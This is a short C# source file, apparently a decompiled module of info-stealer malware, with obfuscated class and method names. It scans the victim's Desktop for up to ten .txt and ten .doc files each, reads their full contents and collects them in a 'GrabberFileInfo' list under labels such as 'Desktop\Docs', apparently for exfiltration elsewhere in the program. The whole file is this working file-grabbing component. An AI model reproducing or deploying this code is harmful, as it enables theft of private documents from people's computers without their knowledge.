using System;
using System.Collections.Generic;
using System.IO;

namespace hostik;

public static class hackrjaw
{
	public static void sppsps()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		List<FileInfo> list = sxfa(folderPath, "*.txt");
		List<FileInfo> list2 = sxfa(folderPath, "*.doc");
		foreach (FileInfo item in list)
		{
			byte[] array = File.ReadAllBytes(item.FullName);
			if (array.Length != 0)
			{
				GrabberFileInfo.gr_s.Add(new GrabberFileInfo
				{
					File = array,
					name = $"Desktop\\Txt\\{item}",
					Length = array.Length
				});
			}
		}
		foreach (FileInfo item2 in list2)
		{
			byte[] array2 = File.ReadAllBytes(item2.FullName);
			if (array2.Length != 0)
			{
				GrabberFileInfo.gr_s.Add(new GrabberFileInfo
				{
					File = array2,
					name = $"Desktop\\Docs\\{item2}",
					Length = array2.Length
				});
			}
		}
	}

	private static List<FileInfo> sxfa(string folder, string extension)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(folder);
		List<FileInfo> list = new List<FileInfo>();
		if (directoryInfo.Exists)
		{
			try
			{
				FileInfo[] files = directoryInfo.GetFiles(extension);
				int num = 0;
				while (true)
				{
					if (num >= files.Length)
					{
						directoryInfo.GetDirectories();
						return list;
					}
					FileInfo item = files[num];
					if (list.Count >= 10)
					{
						break;
					}
					list.Add(item);
					num++;
				}
				return list;
			}
			catch
			{
				return list;
			}
		}
		return list;
	}
}
